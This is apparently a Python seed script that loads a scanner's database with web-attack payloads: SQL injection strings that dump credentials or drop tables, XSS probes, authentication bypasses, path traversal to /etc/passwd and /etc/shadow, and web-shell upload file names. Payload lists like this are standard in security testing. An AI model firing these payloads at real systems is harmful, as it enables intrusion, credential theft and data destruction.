import os
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from models.base import Payload
from dotenv import load_dotenv

load_dotenv()

# Create database URL from environment variable
DATABASE_URL = os.getenv("DATABASE_URL")

# Create engine and session
engine = create_engine(DATABASE_URL)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

def init_payloads():
    db = SessionLocal()

    # SQL Injection payloads
    sqli_payloads = [
        {"category": "sqli", "payload": "'", "description": "Single quote to break SQL query"},
        {"category": "sqli", "payload": "' OR 1=1--", "description": "Common SQL injection bypass"},
        {"category": "sqli", "payload": "' OR 'a'='a", "description": "Always true condition"},
        {"category": "sqli", "payload": "' UNION SELECT NULL--", "description": "UNION based injection with NULL"},
        {"category": "sqli", "payload": "' UNION SELECT NULL, NULL--", "description": "UNION based injection with two NULLs"},
        {"category": "sqli", "payload": "' UNION SELECT NULL, NULL, NULL--", "description": "UNION based injection with three NULLs"},
        {"category": "sqli", "payload": "' AND 1=2 UNION SELECT NULL, version(), NULL--", "description": "Get database version"},
        {"category": "sqli", "payload": "' AND 1=2 UNION SELECT table_name, NULL FROM information_schema.tables--", "description": "Get table names"},
        {"category": "sqli", "payload": "' AND 1=2 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--", "description": "Get column names from users table"},
        {"category": "sqli", "payload": "' AND 1=2 UNION SELECT username, password FROM users--", "description": "Extract user credentials"},
        {"category": "sqli", "payload": "'; DROP TABLE users; --", "description": "Dangerous: Delete users table"},
        {"category": "sqli", "payload": "' OR 1=1; --", "description": "Alternative SQL injection syntax"},
        {"category": "sqli", "payload": "' OR 1=1#", "description": "MySQL comment syntax"},
        {"category": "sqli", "payload": "' OR 1=1;--", "description": "Semicolon in SQL injection"},
        {"category": "sqli", "payload": "admin'--", "description": "Admin bypass"},
        {"category": "sqli", "payload": "' OR 1=1#", "description": "MySQL comment syntax"},
        {"category": "sqli", "payload": "admin' --", "description": "Admin bypass with space"},
        {"category": "sqli", "payload": "admin' OR 'a'='a", "description": "Admin with always true condition"},
        {"category": "sqli", "payload": "root' OR 'a'='a", "description": "Root user bypass"},
        {"category": "sqli", "payload": "\' OR \" \" = \" \"", "description": "Escaped quote injection"}
    ]

    # XSS payloads
    xss_payloads = [
        {"category": "xss", "payload": "<script>alert('XSS')</script>", "description": "Basic XSS alert"},
        {"category": "xss", "payload": "\"><script>alert('XSS')</script>", "description": "XSS with closing tag"},
        {"category": "xss", "payload": "<img src=x onerror=alert('XSS')>", "description": "Image onload XSS"},
        {"category": "xss", "payload": "<svg/onload=alert('XSS')>", "description": "SVG onload XSS"},
        {"category": "xss", "payload": "javascript:alert('XSS')", "description": "JavaScript protocol"},
        {"category": "xss", "payload": "\">alert('XSS')</script>", "description": "XSS with double quote"},
        {"category": "xss", "payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>", "description": "IFrame JavaScript XSS"},
        {"category": "xss", "payload": "<body onload=alert('XSS')>", "description": "Body onload XSS"},
        {"category": "xss", "payload": "<details open ontoggle=alert('XSS')>", "description": "Details tag XSS"},
        {"category": "xss", "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('XSS')\"/>", "description": "SVG with xmlns namespace"},
        {"category": "xss", "payload": "<img src=\"\" onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))\"/>", "description": "Obfuscated XSS with String.fromCharCode"},
        {"category": "xss", "payload": "<a href=\"javascript:alert('XSS')\">Click me</a>", "description": "Anchor tag XSS"},
        {"category": "xss", "payload": "<svg><script>alert('XSS')</script></svg>", "description": "SVG with embedded script"},
        {"category": "xss", "payload": "\" onfocus=\"alert('XSS')\" autofocus=\"\"", "description": "Onfocus XSS with autofocus"},
        {"category": "xss", "payload": "<marquee onstart=\"alert('XSS')\">\"", "description": "Marquee tag XSS"}
    ]

    # IDOR payloads
    idor_payloads = [
        {"category": "idor", "payload": "1", "description": "Test user ID 1"},
        {"category": "idor", "payload": "2", "description": "Test user ID 2"},
        {"category": "idor", "payload": "3", "description": "Test user ID 3"},
        {"category": "idor", "payload": "4", "description": "Test user ID 4"},
        {"category": "idor", "payload": "5", "description": "Test user ID 5"},
        {"category": "idor", "payload": "6", "description": "Test user ID 6"},
        {"category": "idor", "payload": "7", "description": "Test user ID 7"},
        {"category": "idor", "payload": "8", "description": "Test user ID 8"},
        {"category": "idor", "payload": "9", "description": "Test user ID 9"},
        {"category": "idor", "payload": "10", "description": "Test user ID 10"},
        {"category": "idor", "payload": "100", "description": "Test user ID 100"},
        {"category": "idor", "payload": "999", "description": "Test user ID 999"},
        {"category": "idor", "payload": "9999", "description": "Test user ID 9999"},
        {"category": "idor", "payload": "0", "description": "Test user ID 0"},
        {"category": "idor", "payload": "-1", "description": "Test user ID -1"},
        {"category": "idor", "payload": "-2", "description": "Test user ID -2"},
        {"category": "idor", "payload": "1;", "description": "ID with semicolon"},
        {"category": "idor", "payload": "1--", "description": "ID with SQL comment"},
        {"category": "idor", "payload": "1#", "description": "ID with SQL hash comment"},
        {"category": "idor", "payload": "1%20", "description": "ID with URL encoded space"}
    ]

    # Authentication bypass payloads
    auth_bypass_payloads = [
        {"category": "auth-bypass", "payload": "' OR '1'='1", "description": "Standard SQL injection bypass"},
        {"category": "auth-bypass", "payload": "OR 1=1--", "description": "SQL injection with OR 1=1"},
        {"category": "auth-bypass", "payload": "' OR 1=1--", "description": "SQL injection with single quote"},
        {"category": "auth-bypass", "payload": "' OR 1=1#", "description": "SQL injection with MySQL comment"},
        {"category": "auth-bypass", "payload": "' OR 1=1;--", "description": "SQL injection with semicolon"},
        {"category": "auth-bypass", "payload": "admin'--", "description": "Admin bypass with comment"},
        {"category": "auth-bypass", "payload": "' OR 1=1#", "description": "SQL injection with MySQL comment"},
        {"category": "auth-bypass", "payload": "admin' --", "description": "Admin bypass with space and comment"},
        {"category": "auth-bypass", "payload": "admin' OR 'a'='a", "description": "Admin with always true condition"},
        {"category": "auth-bypass", "payload": "root' OR 'a'='a", "description": "Root bypass with always true condition"},
        {"category": "auth-bypass", "payload": "'; DROP TABLE users; --", "description": "Dangerous: Delete users table"},
        {"category": "auth-bypass", "payload": "' OR \" \" = \" \"", "description": "Escaped quote injection"},
        {"category": "auth-bypass", "payload": "admin' OR 1=1--", "description": "Admin with OR 1=1"},
        {"category": "auth-bypass", "payload": "' OR \"a\"=\"a\"", "description": "Double quote injection"},
        {"category": "auth-bypass", "payload": "' OR 'x'='x", "description": "Generic always true condition"}
    ]

    # Directory traversal payloads
    dir_traversal_payloads = [
        {"category": "dir-traversal", "payload": "../../../../etc/passwd", "description": "Common Linux path traversal"},
        {"category": "dir-traversal", "payload": "../../../etc/passwd", "description": "Linux path traversal - reduced"},
        {"category": "dir-traversal", "payload": "../../etc/passwd", "description": "Linux path traversal - reduced"},
        {"category": "dir-traversal", "payload": "../etc/passwd", "description": "Linux path traversal - minimal"},
        {"category": "dir-traversal", "payload": "..\\..\\..\\..\\winnt\\system32\\cmd.exe", "description": "Windows path traversal"},
        {"category": "dir-traversal", "payload": "/etc/passwd", "description": "Direct Linux file access"},
        {"category": "dir-traversal", "payload": "C:/Windows/System32/drivers/etc/hosts", "description": "Windows hosts file"},
        {"category": "dir-traversal", "payload": "C:\\Windows\\System32\\drivers\\etc\\hosts", "description": "Windows hosts file (escaped)"},
        {"category": "dir-traversal", "payload": "../../../../boot.ini", "description": "Windows boot.ini file"},
        {"category": "dir-traversal", "payload": "..%2f..%2f..%2f..%2fetc%2fpasswd", "description": "URL encoded path traversal"},
        {"category": "dir-traversal", "payload": "..%2f..%2f..%2f..%2fetc%2fshadow", "description": "Linux shadow file"},
        {"category": "dir-traversal", "payload": "../../../../windows/win.ini", "description": "Windows win.ini file"},
        {"category": "dir-traversal", "payload": "..%2f..%2f..%2f..%2fetc%2fgroup", "description": "Linux group file"},
        {"category": "dir-traversal", "payload": "../../../../etc/shadow", "description": "Linux shadow access"},
        {"category": "dir-traversal", "payload": "..%2f..%2f..%2f..%2fetc%2fpasswd", "description": "URL encoded path traversal"},
        {"category": "dir-traversal", "payload": "..%5c..%5c..%5c..%5cwinnt%5csystem32%5ccmd.exe", "description": "Windows path traversal (URL encoded backslash)"},
        {"category": "dir-traversal", "payload": ".....//.....//.....//.....//etc//passwd", "description": "Multiple slashes for bypass"},
        {"category": "dir-traversal", "payload": "../../../etc/passwd%00", "description": "Null byte injection for bypass"},
        {"category": "dir-traversal", "payload": "/etc/passwd%00", "description": "Null byte injection for Linux"}
    ]

    # File upload abuse payloads
    file_upload_payloads = [
        {"category": "file-upload", "payload": "shell.php", "description": "PHP web shell"},
        {"category": "file-upload", "payload": "shell.jsp", "description": "JSP web shell"},
        {"category": "file-upload", "payload": "shell.aspx", "description": "ASPX web shell"},
        {"category": "file-upload", "payload": "shell.pl", "description": "Perl web shell"},
        {"category": "file-upload", "payload": "shell.py", "description": "Python web shell"},
        {"category": "file-upload", "payload": "shell.sh", "description": "Shell script web shell"},
        {"category": "file-upload", "payload": "shell.bat", "description": "Batch file web shell"},
        {"category": "file-upload", "payload": "shell.exe", "description": "Executable web shell"},
        {"category": "file-upload", "payload": "shell.dll", "description": "DLL web shell"},
        {"category": "file-upload", "payload": "shell.php.jpg", "description": "Double extension PHP file"},
        {"category": "file-upload", "payload": "shell.jsp.jpg", "description": "Double extension JSP file"},
        {"category": "file-upload", "payload": "shell.aspx.jpg", "description": "Double extension ASPX file"},
        {"category": "file-upload", "payload": "shell.php.gif", "description": "GIF extension with PHP code"},
        {"category": "file-upload", "payload": "shell.php.gif\x00", "description": "Null byte injection for PHP"},
        {"category": "file-upload", "payload": "shell.php\x00.jpg", "description": "Null byte injection for extension bypass"},
        {"category": "file-upload", "payload": "shell.php.", "description": "Trailing dot for bypass"},
        {"category": "file-upload", "payload": "shell.php..", "description": "Trailing dots for bypass"}
    ]

    # Combine all payloads
    all_payloads = [
        *sqli_payloads,
        *xss_payloads,
        *idor_payloads,
        *auth_bypass_payloads,
        *dir_traversal_payloads,
        *file_upload_payloads
    ]

    # Add payloads to database
    for payload_data in all_payloads:
        db_payload = db.query(Payload).filter(
            Payload.category == payload_data["category"],
            Payload.payload == payload_data["payload"]
        ).first()

        if not db_payload:
            db_payload = Payload(
                category=payload_data["category"],
                payload=payload_data["payload"],
                description=payload_data["description"],
                is_active=True
            )
            db.add(db_payload)
        else:
            # Update existing payload if description changed
            if db_payload.description != payload_data["description"]:
                db_payload.description = payload_data["description"]

    db.commit()
    db.close()
    print("Payloads initialized successfully!")

if __name__ == "__main__":
    init_payloads()